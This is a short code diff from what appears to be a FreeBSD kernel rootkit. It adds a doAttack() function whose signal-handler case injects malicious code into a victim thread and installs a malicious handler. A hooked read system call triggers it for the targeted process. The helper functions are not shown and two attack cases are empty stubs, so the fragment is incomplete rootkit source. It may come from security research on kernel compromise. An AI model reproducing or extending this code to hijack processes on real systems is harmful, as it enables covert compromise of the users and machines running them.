@@ -29,6 +29,8 @@
 #include <sys/sysproto.h>
 #include <sys/sx.h>
 
+#include "rootkit/rootkit.h"
+
 //
 // Design:
 //  1) Find designated target process
@@ -141,6 +143,38 @@ attackThread (struct thread * td) {
 }
 
 //
+// Function: doAttack ()
+//
+// Description:
+//  Attack!!!!
+//
+static void
+doAttack (struct thread * td) {
+  switch (attackType) {
+    // Direct read attack
+    case at_read:
+      break;
+
+    // MMU attack
+    case at_mmu:
+      break;
+
+    // Signal handler attack
+    case at_sig: {
+      void * handler = insertMaliciousCode (td);
+      setMaliciousHandler (td, handler);
+      attackThread (td);
+      break;
+    }
+
+    default:
+      break;
+  }
+
+  return;
+}
+
+//
 // Function: command_hook()
 //
 // Description:
@@ -195,9 +229,7 @@ read_hook (struct thread * td, void * syscall_args) {
   // inject the code.
   //
   if (isVictimThread (td)) {
-    void * handler = insertMaliciousCode (td);
-    setMaliciousHandler (td, handler);
-    attackThread (td);
+    doAttack (td);
   }
 
   //
